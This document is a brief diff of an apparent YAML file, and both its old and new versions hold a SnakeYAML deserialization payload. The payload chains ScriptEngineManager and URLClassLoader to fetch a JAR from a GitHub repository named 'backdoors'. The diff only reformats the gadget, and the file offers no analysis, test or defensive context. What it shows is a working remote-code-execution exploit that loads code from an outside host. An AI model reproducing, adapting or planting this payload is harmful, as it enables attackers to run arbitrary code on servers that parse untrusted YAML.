@@ -1,5 +1,4 @@
 !!javax.script.ScriptEngineManager
-  javax.script.ScriptEngineManager: !!java.net.URLClassLoader
-    uRLs:
-      - !!java.net.URL
-        url: "https://github.com/elefantesagradodeluzinfinita/backdoors/raw/main/SimpleHttpGet.jar"
+javax.script.ScriptEngineManager: !!java.net.URLClassLoader
+  uRLs:
+    - !!java.net.URL "https://github.com/elefantesagradodeluzinfinita/backdoors/raw/main/SimpleHttpGet.jar"
